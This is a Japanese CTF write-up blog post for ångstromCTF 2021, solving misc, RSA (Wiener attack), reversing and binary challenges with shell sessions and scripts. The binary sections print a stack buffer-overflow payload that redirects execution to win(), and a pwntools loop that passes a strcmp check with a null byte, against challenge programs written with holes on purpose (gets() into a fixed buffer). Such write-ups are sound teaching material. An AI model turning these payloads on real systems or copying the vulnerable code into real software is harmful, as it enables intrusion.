---
title: "ångstromCTF 2021 Writeup"
date: 2021-04-08T13:00:00+09:00
lastmod: 2021-06-03T22:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF", "Reviewed"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fangstromctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

(2021/06/03 - Binaryを少し復習しました。下の方に追記してます。)

URL: [https://2021.angstromctf.com/challenges](https://2021.angstromctf.com/challenges)
<br /><br />

[昨年のイベント](https://captureamerica.github.io/writeups/post/angstromctf_2020/)に比べて、だいぶ難易度が高かった気がします。

<br>
390点を獲得し、最終順位はキリのいい500位でした。<br />
<img src="https://captureamerica.github.io/writeups/img/angstromctf_2021_score.png" alt="angstromctf_2021_score.png">

<br>

以下は解いたチャレンジです。（後日、Surveyもやってます。）<br />
<img src="https://captureamerica.github.io/writeups/img/angstromctf_2021_solves.png" alt="angstromctf_2021_solves.png">



<br /><br />
## [Misc]: Archaic (50 points)
- - -
### Challenge
> The archaeological team at ångstromCTF has uncovered an archive from over 100 years ago! Can you read the contents?
<br /><br />
Access the file at /problems/2021/archaic/archive.tar.gz on the shell server.


<br />
### Solution


<pre>
team7899@actf:~$ cp /problems/2021/archaic/archive.tar.gz .
team7899@actf:~$ tar zxvf archive.tar.gz
flag.txt
tar: flag.txt: implausibly old time stamp 1921-04-01 22:45:12
team7899@actf:~$ cat flag.txt
cat: flag.txt: Permission denied
team7899@actf:~$ ll
total 52
drwx------   3 team7899 team7899  4096 Apr  3 04:49 ./
drwx--x--x 996 root     root     24576 Apr  3 04:49 ../
-r--r--r--   1 team7899 team7899   150 Apr  3 04:49 archive.tar.gz
-rw-r--r--   1 team7899 team7899   220 Feb 25  2020 .bash_logout
-rw-r--r--   1 team7899 team7899  3771 Feb 25  2020 .bashrc
drwx------   2 team7899 team7899  4096 Apr  3 04:49 .cache/
----------   1 team7899 team7899    37 Apr  1  1921 flag.txt
-rw-r--r--   1 team7899 team7899   807 Feb 25  2020 .profile
team7899@actf:~$ id
uid=1385(team7899) gid=1385(team7899) groups=1385(team7899),1001(teams)
team7899@actf:~$ chmod 644 flag.txt
team7899@actf:~$ cat flag.txt
actf{thou_hast_uncovered_ye_ol_fleg}
</pre>

<br />

Flag: `actf{thou_hast_uncovered_ye_ol_fleg}`


<br /><br />
<br /><br />
## [Misc]: Fish (60 points)
- - -
### Challenge
> Oh, fish! My dinner(fish.png) has turned transparent again. What will I eat now that I can't eat that yummy, yummy, fish head, mmmmmm head of fish mm so good...

Attachment:

- fish.png

<br />
### Solution
「青い空を見上げればいつもそこに白い猫」を使って解きました。

<img src="https://captureamerica.github.io/writeups/img/angstromctf_2021_fish.png" alt="angstromctf_2021_fish.png">

<br />

Flag: `actf{in_the_m0rning_laughing_h4ppy_fish_heads_in_th3_evening_float1ng_in_your_soup}`





<br /><br />
<br /><br />
## [Crypto]: Relatively Simple Algorithm (40 points)
- - -
### Challenge
> RSA strikes strikes again again! Source (rsa.py)
<br /><br />
n = 113138904645172037883970365829067951997230612719077573521906183509830180342554841790268134999423971247602095979484887092205889453631416247856139838680189062511282674134361726455828113825651055263796576482555849771303361415911103661873954509376979834006775895197929252775133737380642752081153063469135950168223
<br />
p = 11556895667671057477200219387242513875610589005594481832449286005570409920461121505578566298354611080750154513073654150580136639937876904687126793459819369
<br />
q = 9789731420840260962289569924638041579833494812169162102854947552459243338614590024836083625245719375467053459789947717068410632082598060778090631475194567
<br />
e = 65537
<br />
c = 108644851584756918977851425216398363307810002101894230112870917234519516101802838576315116490794790271121303531868519534061050530562981420826020638383979983010271660175506402389504477695184339442431370630019572693659580322499801215041535132565595864123113626239232420183378765229045037108065155299178074809432


<br />
### Solution

RsaCtfTool.pyで解けます。

<br>

Flag: `actf{old_but_still_good_well_at_least_until_quantum_computing}`



<br /><br />
<br /><br />
## [Crypto]: Keysar v2 (40 points)
- - -
### Challenge
> Wow! Aplet sent me a message... he said he encrypted it with a key, but lost it. Gotta go though, I have biology homework!

Attachment (中身は省略します):

- chall.py
<br />
- out.txt


<br />
### Solution
最初、chall.pyを解読しようと試みたんですが、out.txtが単一換字式暗号 (monoalphabetic substitution ciphers)っぽかったのと、solveした人数が多かったので、[quipqiup](https://quipqiup.com/)を試したところ、あっさりフラグが取れました。

<br />
Flag: `actf{keyedcaesarmorelikesubstitution}`




<br /><br />
<br /><br />
## [Crypto]: sosig (70 points)
- - -
### Challenge
> Oh man, RSA is so cool. But I don't trust the professionals, I do things MY WAY. And I'll make my encryption EXTRA secure with an extra thicc e! You'll never crack it!
<br><br>
n: 14750066592102758338439084633102741562223591219203189630943672052966621000303456154519803347515025343887382895947775102026034724963378796748540962761394976640342952864739817208825060998189863895968377311649727387838842768794907298646858817890355227417112558852941256395099287929105321231423843497683829478037738006465714535962975416749856785131866597896785844920331956408044840947794833607105618537636218805733376160227327430999385381100775206216452873601027657796973537738599486407175485512639216962928342599015083119118427698674651617214613899357676204734972902992520821894997178904380464872430366181367264392613853
<br>
e: 1565336867050084418175648255951787385210447426053509940604773714920538186626599544205650930290507488101084406133534952824870574206657001772499200054242869433576997083771681292767883558741035048709147361410374583497093789053796608379349251534173712598809610768827399960892633213891294284028207199214376738821461246246104062752066758753923394299202917181866781416802075330591787701014530384229203479804290513752235720665571406786263275104965317187989010499908261009845580404540057576978451123220079829779640248363439352875353251089877469182322877181082071530177910308044934497618710160920546552403519187122388217521799
<br>
c: 13067887214770834859882729083096183414253591114054566867778732927981528109240197732278980637604409077279483576044261261729124748363294247239690562657430782584224122004420301931314936928578830644763492538873493641682521021685732927424356100927290745782276353158739656810783035098550906086848009045459212837777421406519491289258493280923664889713969077391608901130021239064013366080972266795084345524051559582852664261180284051680377362774381414766499086654799238570091955607718664190238379695293781279636807925927079984771290764386461437633167913864077783899895902667170959671987557815445816604741675326291681074212227



<br />
### Solution
先日やったpicoCTF 2021のDachshund Attacksと同様の問題でした。

以下のツールを使わせてもらいました。<br />
https://github.com/orisano/owiener

```Python
import owiener

e = 1565336867050084418175648255951787385210447426053509940604773714920538186626599544205650930290507488101084406133534952824870574206657001772499200054242869433576997083771681292767883558741035048709147361410374583497093789053796608379349251534173712598809610768827399960892633213891294284028207199214376738821461246246104062752066758753923394299202917181866781416802075330591787701014530384229203479804290513752235720665571406786263275104965317187989010499908261009845580404540057576978451123220079829779640248363439352875353251089877469182322877181082071530177910308044934497618710160920546552403519187122388217521799
n = 14750066592102758338439084633102741562223591219203189630943672052966621000303456154519803347515025343887382895947775102026034724963378796748540962761394976640342952864739817208825060998189863895968377311649727387838842768794907298646858817890355227417112558852941256395099287929105321231423843497683829478037738006465714535962975416749856785131866597896785844920331956408044840947794833607105618537636218805733376160227327430999385381100775206216452873601027657796973537738599486407175485512639216962928342599015083119118427698674651617214613899357676204734972902992520821894997178904380464872430366181367264392613853
c = 13067887214770834859882729083096183414253591114054566867778732927981528109240197732278980637604409077279483576044261261729124748363294247239690562657430782584224122004420301931314936928578830644763492538873493641682521021685732927424356100927290745782276353158739656810783035098550906086848009045459212837777421406519491289258493280923664889713969077391608901130021239064013366080972266795084345524051559582852664261180284051680377362774381414766499086654799238570091955607718664190238379695293781279636807925927079984771290764386461437633167913864077783899895902667170959671987557815445816604741675326291681074212227
d = owiener.attack(e, n)

if d is None:
    print("Failed")
else:
    # print(hex(pow(c,d,n)))
    hex_string = hex(pow(c,d,n))
    hex_string = hex_string[2::] # To remove "0x"
    print(bytearray.fromhex(hex_string).decode())
```


<br />

Flag: `actf{d0ggy!!!111!1}`

＃やっぱりイヌ（ダックスフンド）なんですね。




<br /><br />
<br /><br />
## [Rev]: FREE FLAGS!!1!! (50 points)
- - -
### Challenge
> Clam was browsing armstrongctf.com when suddenly a popup appeared saying "GET YOUR FREE FLAGS HERE!!!" along with a download(free_flags). Can you fill out the survey for free flags?
<br><br>
Find it on the shell server at /problems/2021/free_flags or over netcat at nc shell.actf.co 21703.
<br><br>
Hint: Check out decompilers like GHIDRA.



Attachment:

- free_flags (ELF 64-bit)


<br />
### Solution
ヒントにある通り、ghidraを使って解きました。

```C
ulong main(void)

{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  uint local_128;
  int local_124;
  int local_120;
  int local_11c;
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts(
      "Congratulations! You are the 1000th CTFer!!! Fill out this short survey to get FREE FLAGS!!!"
      );
  puts("What number am I thinking of???");
  __isoc99_scanf(0x1020e1,&local_11c);
  if (local_11c == 0x7a69) {
    puts("What two numbers am I thinking of???");
    __isoc99_scanf("%d %d",&local_120,&local_124);
    if ((local_120 + local_124 == 0x476) && (local_120 * local_124 == 0x49f59)) {
      puts("What animal am I thinking of???");
      __isoc99_scanf(" %256s",local_118);
      sVar2 = strcspn(local_118,"\n");
      local_118[sVar2] = '\0';
      iVar1 = strcmp(local_118,"banana");
      if (iVar1 == 0) {
        puts("Wow!!! Now I can sell your information to the Russian government!!!");
        puts("Oh yeah, here\'s the FREE FLAG:");
        print_flag();
        local_128 = 0;
      }
      else {
        puts("Wrong >:((((");
        local_128 = 1;
      }
    }
    else {
      puts("Wrong >:((((");
      local_128 = 1;
    }
  }
```

<br>

1つ目のチェック：

0x7a69を10進数で入れました。

`31337`

<br>

2つ目のチェック：

0x49f59を素因数分解すると、3 · 241 · 419になります。足して1142になるのは以下の2つの値です。

`723 419`

<br>

3つ目のチェック：

`banana`

<br />

Flag: `actf{what_do_you_mean_bananas_arent_animals}`



<br /><br />
<br /><br />
## [Binary]: tranquil (70 points)
- - -
### Challenge
> Finally, inner peace - Master Oogway
<br><br>
Connect with nc shell.actf.co 21830, or find it on the shell server at /problems/2021/tranquil.
<br><br>
Hint: The compiler gives me a warning about gets... I wonder why.


Attachment:

- tranquil.c


```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win(){
    char flag[128];
    
    FILE *file = fopen("flag.txt","r");
    
    if (!file) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    
    fgets(flag, 128, file);
    
    puts(flag);
}





int vuln(){
    char password[64];
    
    puts("Enter the secret word: ");
    
    gets(&password);
    
    
    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    }
    
    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
    
    // not so easy for you!
    // win();
    
    return 0;
}

```

<br />
### Solution
BOFのチャレンジです。

<br />

checksecより、PIEは無効になっています。
<pre>
team7899@actf:~$ checksec /problems/2021/tranquil/tranquil
[*] '/problems/2021/tranquil/tranquil'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)   <<<
</pre>


<br />
win()関数のアドレスは、0x0000000000401196です。

<pre>
team7899@actf:~$ gdb /problems/2021/tranquil/tranquil
:
:
(gdb) i func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  setbuf@plt
0x0000000000401050  printf@plt
0x0000000000401060  fgets@plt
0x0000000000401070  strcmp@plt
0x0000000000401080  gets@plt
0x0000000000401090  fopen@plt
0x00000000004010a0  exit@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  win   <<<
</pre>

<br>

まずは、バイナリファイルをshell serverから持ってきて、ローカルでテストしました。

<pre>
$ (python -c 'print("A"*64+"B"*8+"\x96\x11\x40\x00\x00\x00\x00\x00")' ; cat - ) | ./tranquil
Enter the secret word: 
Login failed!
Missing flag.txt. Contact an admin if you see this on remote.
</pre>

<br>

同じバイナリなのに、shell server上では以下のようにしないとフラグが取れませんでした。理由は知らないです。

<pre>
team7899@actf:/problems/2021/tranquil$ (python -c 'print("A"*62+"\x96\x11\x40\x00\x00\x00\x00\x00\x96\x11\x40\x00\x00\x00\x00\x00")' ; cat - ) | ./tranquil
Enter the secret word:
Login failed!
actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}
</pre>


<br>

Flag: `actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}`



<br /><br />
<br /><br />
<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
<br />
ここから下はイベント終了後に行った復習です。



<br /><br />
<br /><br />
## [Binary]: Secure Login (50 points)
- - -
### Challenge
> My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most secure login service in the world (source).
<br><br>
Hint: Look into how strcmp works and how that fits in with what /dev/urandom returns.


Attachment:

- login  (ELF 64bit)
- login.c

ソースコードの中身：

{{< highlight c "linenos=table,hl_lines=6 21" >}}
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}
{{< / highlight >}}

<br />
### Solution
urandomの値と入力値をstrcmpで比較しているところがポイントです。urandomの先頭の1バイトが00だとNull文字になり、入力値にNull文字を指定するとstrcmpがパスできます。1バイトなので、確率は1/256です。

その１

```Python
#!/usr/bin/env python
from pwn import *
context.log_level = 'critical'

while 1:
    s = process('./login')
    s.recv()
    s.sendline('\x00\n')
    msg = s.recvline()
    if "Wrong" not in msg:
        print(msg)
    s.close()
```

<br />
実行結果：
<pre>
$ ./login_solve.py
Enter the password: actf{if_youre_reading_this_ive_been_hacked}
</pre>


<br /><br />
その２

以下のやり方でもできます。エンターを押し続けていると、そのうちフラグが取れます。

<pre>
$ while true ; do ((python -c 'print("\x00")'; cat -) | ./login) ; done
Welcome to my ultra secure login service!
Enter the password: Wrong!

Welcome to my ultra secure login service!
Enter the password: Wrong!

Welcome to my ultra secure login service!
Enter the password: Wrong!

Welcome to my ultra secure login service!
Enter the password: Wrong!

Welcome to my ultra secure login service!
Enter the password: actf{if_youre_reading_this_ive_been_hacked}

</pre>

<br />

Flag: `actf{if_youre_reading_this_ive_been_hacked}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

